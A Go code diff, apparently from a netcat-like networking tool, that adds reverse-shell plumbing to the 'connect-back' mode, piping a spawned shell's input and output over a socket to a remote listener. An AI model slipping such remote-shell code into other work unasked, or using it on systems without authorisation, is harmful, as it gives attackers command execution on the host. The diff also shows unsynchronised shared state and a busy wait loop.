@@ -35,8 +35,10 @@ func Run(c conn.ConnectionGetter) {
 
 	// Make connection:
 	var socketInterface conn.SocketInterface
+	//var socketStruct conn.RealSocket
 	if thisPeer.ConnectionType == "offense" {
 		socketInterface = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
+		//socketStruct = socketInterface.(*conn.RealSocket)
 	} else {
 		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
 	}
@@ -53,6 +55,7 @@ func Run(c conn.ConnectionGetter) {
 		if shellErr != nil {
 			// Send error through socket back to listener peer.
 			socketInterface.Write([]byte(shellErr.Error()))
+			socketInterface.Close()
 			os.Exit(1)
 		}
 		// Connect shell to peer:
@@ -69,14 +72,85 @@ func Run(c conn.ConnectionGetter) {
 	// If we are the connect-back peer & the user wants a shell, start the shell here:
 	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
 		// Use type-assertion to uncover the actual socket from the interface:
-		realSocket := socketInterface.(*conn.RealSocket)
+
+		// Get readers & writers for shell & socket to give to io.Copy:
+		socketReader := socketInterface.GetReader()
+		socketWriter := socketInterface.GetWriter()
+
+		stdoutReader, er_ := shellInterface.GetStdoutReader()
+		if er_ != nil {
+			socketInterface.Write([]byte(er_.Error()))
+			socketInterface.Close()
+			os.Exit(1)
+		}
+
+		stderrReader, e_r := shellInterface.GetStderrReader()
+		if e_r != nil {
+			socketInterface.Write([]byte(e_r.Error()))
+			socketInterface.Close()
+			os.Exit(1)
+		}
+
+		stdinWriter, _rr := shellInterface.GetStdinWriter()
+		if _rr != nil {
+			socketInterface.Write([]byte(_rr.Error()))
+			socketInterface.Close()
+			os.Exit(1)
+		}
 
 		// Start the shell:
-		err := shellInterface.StartShell(realSocket)
+		err := shellInterface.StartShell()
 		if err != nil {
 			// Since we have the socket, send the error thru the socket then quit (ooh sneaky!):
-			realSocket.Write([]byte(err.Error()))
+			socketInterface.Write([]byte(err.Error()))
+			socketInterface.Close()
 			os.Exit(1)
+		}
+
+		// Start go routines to connect pipes & move data:
+		var routineErr error
+		var commandPending bool = false
+
+		go func(stdout *io.ReadCloser, socket *io.Writer) {
+			_, err := io.Copy(*socket, *stdout)
+			if err != nil {
+				routineErr = fmt.Errorf("Error copying stdout to socket: %v\n", err)
+				return
+			}
+			commandPending = false
+		}(stdoutReader, socketWriter)
+
+		go func(stderr *io.ReadCloser, socket *io.Writer) {
+			_, err := io.Copy(*socket, *stderr)
+			if err != nil {
+				routineErr = fmt.Errorf("Error copying stderr to socket: %v\n", err)
+				return
+			}
+			commandPending = false
+		}(stderrReader, socketWriter)
+
+		go func(socket *io.Reader, stdin *io.WriteCloser) {
+			commandPending = true
+			_, err := io.Copy(*stdin, *socket)
+			if err != nil {
+				routineErr = fmt.Errorf("Error copying socket to stdin: %v\n", err)
+				return
+			}
+		}(socketReader, stdinWriter)
+
+		// For loop which checks for an error captured in go routines.
+		//...... If there is no error, then a small timeout prevents the process from lagging:
+		for {
+			if routineErr != nil {
+				// Send the error msg down the socket, then exit quitely:
+				socketInterface.Write([]byte(routineErr.Error()))
+				os.Exit(1)
+			}
+
+			if commandPending {
+				// Timeout:
+				time.Sleep(69 * time.Millisecond)
+			}
 		}
 	} else {
 		// Go routines to read user input:
